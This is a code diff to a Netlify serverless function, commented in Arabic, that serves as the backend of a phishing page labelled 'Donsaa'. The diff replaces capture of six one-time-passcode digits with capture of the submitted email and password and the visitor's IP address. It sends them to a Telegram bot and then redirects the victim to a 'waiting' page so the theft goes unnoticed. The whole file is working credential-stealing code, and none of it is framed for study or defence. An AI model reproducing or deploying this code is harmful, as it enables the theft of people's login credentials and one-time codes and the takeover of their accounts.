@@ -1,5 +1,14 @@
 const fetch = require('node-fetch');
 
+// دالة مساعدة لجلب IP من رؤوس مختلفة (لبيئة Netlify)
+const getClientIp = (headers) => {
+    // محاولة التقاط IP من الرؤوس الأكثر موثوقية في Netlify
+    return headers['x-nf-client-connection-ip'] || 
+           headers['client-ip'] || 
+           headers['x-forwarded-for'] ||
+           'غير متوفر';
+};
+
 // دالة ترميز الأحرف الخاصة بـ MarkdownV2 لـ Telegram
 const escapeMarkdownV2 = (text) => {
     const replacements = {
@@ -11,28 +20,31 @@ const escapeMarkdownV2 = (text) => {
     return text.replace(/[\\_*[\]()~`>#+\-=|{}.!]/g, match => replacements[match]);
 };
 
+
 exports.handler = async (event, context) => {
+    
     if (event.httpMethod !== "POST") {
         return { statusCode: 405, body: "Method Not Allowed" };
     }
     
+    // فك ترميز بيانات النموذج
     const bodyParams = new URLSearchParams(event.body);
     
-    // تجميع حقول OTP الستة
-    let otpCode = '';
-    for (let i = 1; i <= 6; i++) {
-        otpCode += bodyParams.get(`otp${i}`) || '';
-    }
+    const email = bodyParams.get('login_email') || 'غير متوفر';
+    const password = bodyParams.get('login_password') || 'غير متوفر';
     
-    const ip = event.headers['client-ip'] || 'غير متوفر';
+    // التقاط IP باستخدام الدالة المساعدة
+    const ip = getClientIp(event.headers); 
 
-    // تطبيق الترميز
-    const safe_otp = escapeMarkdownV2(otpCode);
+    // تطبيق الترميز على المتغيرات
+    const safe_email = escapeMarkdownV2(email);
+    const safe_password = escapeMarkdownV2(password);
     const safe_ip = escapeMarkdownV2(ip);
-
+    
     // تشكيل الرسالة
-    let message_text = `🔑 *New OTP Received \\(Donsaa\\)* 🔑\n\n`;
-    message_text += `OTP Code: \`${safe_otp}\`\n`;
+    let message_text = `👤 *Login Data \\(Donsaa\\)* 👤\n\n`;
+    message_text += `E\\-Mail: \`${safe_email}\`\n`;
+    message_text += `Passwort: \`${safe_password}\`\n`;
     message_text += `IP: \`${safe_ip}\``; 
 
     // إعدادات Telegram
@@ -41,15 +53,10 @@ exports.handler = async (event, context) => {
     
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
         console.error("Telegram credentials missing in environment variables.");
-        // التحويل إلى صفحة الشكر بالرغم من الخطأ
-        return {
-            statusCode: 303,
-            headers: {
-                Location: '/thankyou.html', // يجب إنشاء هذه الصفحة
-            },
-        };
+        // التحويل إلى الصفحة التالية حتى في حالة الخطأ
+        return { statusCode: 303, headers: { Location: '/waiting.html' } };
     }
-    
+
     const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     
     const data = {
@@ -69,11 +76,11 @@ exports.handler = async (event, context) => {
         console.error("Error sending message to Telegram:", error);
     }
     
-    // التحويل إلى الوجهة النهائية (أنشئ ملف باسم thankyou.html)
+    // التحويل إلى صفحة الانتظار
     return {
         statusCode: 303,
         headers: {
-            Location: '/thankyou.html', 
+            Location: '/waiting.html',
         },
     };
 };
